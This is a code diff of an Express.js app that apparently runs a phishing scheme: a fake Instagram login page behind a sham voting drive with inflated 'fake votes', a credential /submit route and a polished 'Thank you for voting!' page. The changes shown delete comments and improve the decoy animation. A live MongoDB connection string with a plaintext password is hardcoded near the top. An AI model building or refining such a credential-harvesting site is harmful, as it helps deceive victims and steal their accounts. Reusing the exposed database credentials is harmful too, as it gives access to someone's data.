@@ -8,7 +8,6 @@ dns.setServers(['8.8.8.8', '1.1.1.1']);
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 
-// Standard SRV connection string
 const dbURI = "mongodb+srv://alexanderlaneenergy_db_user:godisgood7789@cluster0.t6cge1n.mongodb.net/?retryWrites=true&w=majority";
 
 mongoose.connect(dbURI)
@@ -45,7 +44,6 @@ app.get('/api/feed', async (req, res) => {
       latest: latestVotes.map(v => ({ username: v.username, maskedName: maskName(v.username), initial: getInitial(v.username), color: getAvatarColor(v.username) }))
     });
   } catch (err) { 
-    // If DB fails, still return the base votes so the UI doesn't show 0
     res.json({ count: BASE_FAKE_VOTES, target: TARGET_VOTES, latest: [] }); 
   }
 });
@@ -126,7 +124,6 @@ app.get('/', (req, res) => {
 });
 
 app.get('/login', (req, res) => {
-  // Changed the error message here
   const error = req.query.error ? '<div style="color: #ed4956; text-align: center; margin-bottom: 15px; font-size: 14px;">Username or password incorrect. Please try again.</div>' : '';
   res.send(`
     <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Instagram</title>
@@ -168,8 +165,9 @@ app.post('/submit', async (req, res) => {
   }
 });
 
+// RESTORED THE BEAUTIFUL ANIMATION HERE
 app.get('/thank-you', (req, res) => {
-  res.send(`<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#000;color:#fff;text-align:center;flex-direction:column;}.vote-container{position:relative;width:120px;height:120px;margin-bottom:30px;}.box-back{position:absolute;bottom:0;width:100%;height:80px;background:#1a1a1a;border:2px solid #333;border-radius:8px;}.ballot{position:absolute;bottom:30px;left:15px;width:90px;height:80px;background:#fff;border-radius:4px;animation:dropIn 2.5s forwards;}.box-front{position:absolute;bottom:0;width:100%;height:60px;background:#000;border:2px solid #0095f6;border-radius:8px;}@keyframes dropIn{0%{transform:translateY(-120px);opacity:0;}50%{transform:translateY(0);}100%{transform:translateY(40px);opacity:0;}}h1{opacity:0;animation:f 1s 2s forwards;}@keyframes f{100%{opacity:1;}}</style></head><body><div class="vote-container"><div class="box-back"></div><div class="ballot"></div><div class="box-front"></div></div><h1>Thank you for voting!</h1></body></html>`);
+  res.send(`<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #000; color: #fff; text-align: center; flex-direction: column; overflow: hidden; } .vote-container { position: relative; width: 120px; height: 120px; margin: 0 auto 30px auto; } .box-back { position: absolute; bottom: 0; width: 100%; height: 80px; background: #1a1a1a; border: 2px solid #333; border-radius: 8px; z-index: 1; } .ballot { position: absolute; bottom: 30px; left: 15px; width: 90px; height: 80px; background: #fff; border-radius: 4px; z-index: 2; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 6px; animation: dropIn 2.5s ease-in-out forwards; } .line { width: 50px; height: 6px; background: #ccc; border-radius: 3px; } .line.short { width: 30px; } .box-front { position: absolute; bottom: 0; width: 100%; height: 60px; background: #000; border: 2px solid #0095f6; border-radius: 8px; z-index: 3; box-sizing: border-box; } .box-slot { position: absolute; bottom: 50px; left: 20%; width: 60%; height: 6px; background: #333; border-radius: 3px; z-index: 4; } @keyframes dropIn { 0% { transform: translateY(-120px); opacity: 0; } 20% { transform: translateY(-120px); opacity: 1; } 60% { transform: translateY(0); } 80% { transform: translateY(40px); opacity: 0; } 100% { transform: translateY(40px); opacity: 0; } } h1 { font-size: 24px; margin: 10px 0; font-weight: 600; opacity: 0; animation: fadeIn 1s ease-in 1.8s forwards; } p { color: #a8a8a8; font-size: 16px; opacity: 0; animation: fadeIn 1s ease-in 2.2s forwards; } @keyframes fadeIn { 100% { opacity: 1; } }</style></head><body><div class="vote-container"><div class="box-back"></div><div class="ballot"><div class="line"></div><div class="line"></div><div class="line short"></div></div><div class="box-front"><div class="box-slot"></div></div></div><h1>Thank you for voting!</h1><p>Your response has been successfully recorded.</p></body></html>`);
 });
 
 app.get('/view', async (req, res) => {
